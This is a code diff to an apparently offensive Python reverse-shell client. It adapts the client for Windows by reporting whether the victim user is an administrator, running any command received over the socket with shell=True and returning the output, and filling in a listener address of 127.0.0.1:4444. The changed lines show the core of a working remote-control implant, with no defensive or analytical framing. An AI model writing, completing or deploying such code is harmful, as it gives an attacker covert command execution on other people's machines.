@@ -2,6 +2,7 @@ import socket
 import subprocess
 import os
 import sys
+import ctypes
 import platform
 import time
 
@@ -21,7 +22,7 @@ def session_handler():
     print(f"[+] Connecting to {HOST_IP}...")
     sock.connect((HOST_IP, HOST_PORT))
     print(f"[+] Connected to {HOST_IP}.")
-    outbound(f"Linux {os.getuid()}")
+    outbound(ctypes.windll.shell32.IsUserAnAdmin())
     time.sleep(5)
     operating_system = platform.uname()
     operating_system = f"{operating_system[0]}{operating_system[2]}"
@@ -56,14 +57,14 @@ def session_handler():
         # case for handling commands without arguments
         else:
             # encoding="oem" is for Windows encoding, remove parameter otherwise
-            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8")
+            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="oem")
             output = command.stdout.read() + command.stderr.read()
             outbound(output)
 
 if __name__ == "__main__":
     try:
-        HOST_IP = 'INPUT_IP_HERE'
-        HOST_PORT = INPUT_PORT_HERE
+        HOST_IP = '127.0.0.1'
+        HOST_PORT = 4444
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         session_handler()
     except Exception as error:
